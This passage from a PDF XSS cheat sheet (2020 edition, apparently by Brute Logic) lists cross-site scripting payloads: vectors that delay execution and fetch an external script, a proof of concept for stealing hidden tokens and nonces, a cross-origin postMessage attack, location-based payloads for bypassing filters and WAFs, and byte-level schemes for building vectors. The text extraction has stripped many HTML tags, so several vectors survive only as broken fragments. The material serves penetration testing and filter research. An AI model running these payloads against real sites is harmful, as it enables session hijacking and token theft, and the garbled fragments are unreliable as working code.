Use to prevent XSS in every context as long as input does not reflect in non-delimited
strings, in the middle of backticks or any other eval-like function (all those in JS context). It
does not prevent against DOM-based XSS, only source-based XSS cases.
$input = preg_replace("/:|\\\/", "", htmlentities($input, ENT_QUOTES))
JavaScript Execution Delay
Use when a javascript library or any other required resource for injection is not fully loaded
in the execution of payload. A JQuery-based external call is used as example.
onload=function(){$.getScript('//brutelogic.com.br/2.js')}
onload=x=>$.getScript('//brutelogic.com.br/2.js')
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 24
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Image Vectors - Alternative Event Handlers
Use to trigger image vectors with event handlers different than onerror.
onloadend=alert(1)>
onloadstart=alert(1)>
Shortest XSS
Use when you have a limited slot for injection. Requires a native script (present in source
code already) called with relative path placed after where injection lands. Attacker server
must reply with attacking script to the exact request done by native script (same path) or
within a default 404 page (easier). The shorter domain is, the better.
Mobile-only Event Handlers
Use when targeting mobile applications.
Body Tag
A collection of body vectors. Last one works only for Internet Explorer.
#x
#x
press F12!
press F1!
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 25
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Less Known XSS Vectors
A collection of less known XSS vectors.
12
right click me!
Alternative PoC - Shake Your Body
Use to shake all the elements of the page as a good visualization of the vulnerability.
setInterval(x=>{b=document.body.style,b.marginTop=(b.marginTop=='4px')?'-4px':'4px';},5)
Alternative PoC - Brutality
Use to display an image of Mortal Kombat’s Sub-Zero character along with a “brutality”
game sound.
d=document,i=d.createElement('img');i.src='//brutelogic.com.br/brutality.jpg';
d.body.insertBefore(i,d.body.firstChild);new(Audio)('//brutelogic.com.br/brutality.mp3').play();
Alternative PoC - Alert Hidden Values
Use to prove that all hidden HTML values like tokens and nonces in target page can be stolen.
f=document.forms;for(i=0;i
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 26
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Cross-Origin Script - CrossPwn
Save content below as .html file and use as following:
http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/
status.html&msg=alert(document.domain)
Where “facebook.com” is an allowed origin and “localhost” is attacking domain,
“//brutelogic.com.br/tests/status.html” is target page and “alert(document.domain)”
is message sent (payload).
Code
CrossPwn
OnMessage XSS
Use target & msg as URL parameters.
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 27
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Location Based Payloads
The following XSS vectors use a more elaborated way to execute the payload making use of
document properties to feed another document property, the location one.
That leads to complex vectors which can be very useful to bypass filters and WAFs.
Because they use arbitrary tags (XHTML), any of the Agnostic Event Handlers seen before
can be used. Here, “onmouseover” will be used as default.
Encode the plus sign (+) as %2B in URLs.
Location Basics
Vectors with simpler manipulation to achieve the redirection to javascript pseudo-protocol.
javascript:alert(1)//
Location with URL Fragment
It’s required to use the vector with an unencoded # sign. If used in POST requests, URL
fragment must be used in action URL.
:/*hoverme!
#*/alert(1)
:'hoverme!
#'-alert(1)
hoverme!#`-alert(1)
javascript:'-`hoverme!#`-alert(1)
cript:'-`hoverme!
#`-alert(1)
hoverme!#%0Aalert(1)
javascript:#%0Aalert(1)
cript:#%0Aalert(1)
Location with Leading Alert
`-alert(1)hoverme!
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 28
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
`-alert(1)cript:`hoverme!
javascript:1/*hoverme!*/
javascript:/*hoverme!
*/"javascript:/*hoverme!
Location with Self URL (last is FF Only)
It’s required to replace [P} with the vulnerable parameter where input is used. Encode “&” as
%26 in URLs.
?[P]=&lt;svg/onload=alert(1)>hoverme!
&[P]=&lt;svg/onload=alert(1)>hoverme!
hoverme!
&[P]=&lt;svg/onload=alert(1)>hoverme!
Location with Template Literal
${alert(1)}hoverme!
${alert(1)}javascript:`//hoverme!
${alert(1)}cript:`//hoverme!
${alert(1)}`hoverme!
${alert(1)}`cript:`hoverme!
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 29
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Inner & Outer HTML Properties Alternative
These last vectors make use of innerHTML and outerHTML properties of elements to get
the same result as the location ones. But they requre to create a complete HTML vector
instead of a “javascript:alert(1)” string. The following collections of elements can be used
here with index 0 to make it easier to follow: all[0], anchors[0], embeds[0], forms[0],
images[0], links[0] and scripts[0]. They all can replace head or body elements used below.
XSS Vector Schemes
There are basically 3 different schemes to build a HTML-based XSS vector. All chars and
bytes used to separate the fields are shown in drop down according to a valid syntax.
%0X means every byte from %00 up to %0F as well as %1X. “ENT” means HTML ENTITY
and it means that any of the allowed chars or bytes can be used in their HTML entity forms
(string and numeric).
Lastly, notice the “javascript” word might have some bytes in between or not and all of its
characters can also be URL or HTML encoded.
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 30
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Vector Scheme 1 (tag name + handler)
%09 %09 %09 %09
%0A %0A %0A %0A
%0C %0C %0B %0B
%0D %0D %0C %0C
%20 %20 %0D %0D
%2F %20 %20
/ %22 %22
+ %27 %27
' '
" "
+ +
Vector Scheme 2 (tag name + attribute + handler)
%09 %09 %09 %09 %09 %09 %09
%0A %0A %0A %0A %0A %0A %0A
%0C %0C %0C %0C %0C %0B %0B
%0D %0D %0D %0D %0D %0C %0C
%20 %20 %20 %20 %20 %0D %0D
%2F %2F %22 %22 %20 %20
/ / %27 %27 %22 %22
+ + ' ' %27 %27
" " ' '
+ + " "
+ +
Vector Scheme 3 (tag name + href|src|data|action|formaction)
%09 %09 %0X %09 %09 %09
%0A %0A %1X %0A %0A %0A
%0C %0C %20 %0D %0D %0B
%0D %0D %22 ENT ENT %0C
%20 %20 %27 %0D
%2F %2F ENT %20
/ / + %22
+ + %27
'
"
+
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 31
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 32